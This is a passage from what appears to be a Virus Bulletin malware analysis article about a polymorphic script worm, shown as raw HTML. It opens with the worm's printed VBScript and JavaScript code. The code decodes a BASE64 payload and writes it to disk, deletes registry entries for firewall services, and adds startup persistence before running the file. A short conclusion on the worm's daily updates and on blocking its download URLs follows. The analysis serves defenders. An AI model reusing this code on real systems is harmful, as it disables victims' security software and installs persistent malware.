Len(g)&gt;50000 Then\nExit For\nEnd If\ng=&quot;&quot;\nNext\nSub
bs\nz=Len(g)\nIf(z)Then\ni=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\
/&quot;\nFor
v=1 To z Step 4\nj=3\nm=0\nFor s=0 To 3\no=Mid(g,v+s,1)\nIf o=&quot;=&quot;
Then\nj=j-1\nq=0\nElseIf o=&quot;?&quot; Then\nSet
k=f.CreateTextFile(b,True)\nk.Write t\nk.Close\nExit
Sub\nElse\nq=InStr(1,i,o,vbBinaryCompare)-1\nEnd
If\nm=64*m+q\nNext\nm=Hex(m)\nm=String(6-Len(m),&quot;0&quot;)&amp;m\nr=Chr(CByte(&quot;&amp;H&quot;&amp;Mid(m,1,2)))+Chr
(CByte(&quot;&amp;H&quot;&amp;Mid(m,3,2)))
+Chr(CByte(&quot;&amp;H&quot;&amp;Mid(m,5,2)))\nt=t&amp;Left(r,j)\nNext\nEnd
If\nEnd Sub\nEnd If\nbs&lt;\/script&gt;&lt;script language=JavaScript&gt;function
f1(){b1=0;function
f2(na){b2=0;r1=&quot;HKLM&quot;+cj+&quot;SYSTEM&quot;+cj+&quot;CurrentControlSet&quot;+cj+&quot;Services&quot;+cj;try{n.RegDelete
(r1+na+cj);b2=1;}catch(t1){};
return(b2);}r2=&quot;HKLM&quot;+cj+&quot;SOFTWARE&quot;+cj+&quot;Microsoft&quot;+cj;ke=&quot;Active
Setup&quot;+cj+&quot;Installed
Components&quot;+cj+&quot;{CD5AC91B-AE7B-E83A-0C4C-E616075972F3}&quot;+cj+&quot;Stubpath&quot;;if(f2(&quot;pcipim&quot;)+f2
(&quot;pcIPPsC&quot;)+f2(&quot;RapDrv&quot;)+f2
(&quot;FirePM&quot;)+f2(&quot;KmxFile&quot;))b1=1;try{n.RegWrite(r2+ke,b,&quot;REG_SZ&quot;);n.RegRead(r2+ke);}catch(t1)
{try{f.CopyFile(b,n.RegRead(r2+&quot;Windows&quot;
+cj+&quot;CurrentVersion&quot;+cj+&quot;Explorer&quot;+cj+&quot;Shell
Folders&quot;+cj+&quot;Common
Startup&quot;)+cj);}catch(t1){b1=0};};return(b1);}try{if(nx&amp;&amp;!f1())n.run(b);}catch(y){};&lt;\/script&gt;&#39;);};
setTimeout(&quot;u()&quot;,0);&lt;/script&gt;</pre><p>The extensive use of scripting tricks made it rather difficult to detect the worm scripts. The polymorphic nature of the script left very short and non-specific possible scan strings. Virus analysts were able to practise their script detection skills almost on a daily basis as the new, reshaped scripts came out.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2974729"></a>Conclusion</h2></div></div></div><p>This is a very complex malicious program. The developer of this worm may have written for pecuniary gain &ndash; possibly on a per-order basis. The worm&#39;s infection methods vary and it updates itself frequently, so it&#39;s possible for new updates to come sooner than a virus database is updated. The frequency of updating is one per day on average, but sometimes we have seen two updates a day.</p><p>The infection script is polymorphic because the name of the variables of a script is easy to modify if the script is generated on the fly.</p><p>The weakest part of the worm is its downloader script which downloads the BASE64 encoded form of the worm from the given URL list. Blocking these URLs can slow the pace of the infection.</p></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Not a feeble attempt&url=https://www.virusbulletin.com/virusbulletin/2006/04/not-feeble-attempt"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2006/04/not-feeble-attempt'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2006/04/not-feeble-attempt&title=Not a feeble attempt"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2006/04/not-feeble-attempt&t=Not a feeble attempt"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2006/04/not-feeble-attempt"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>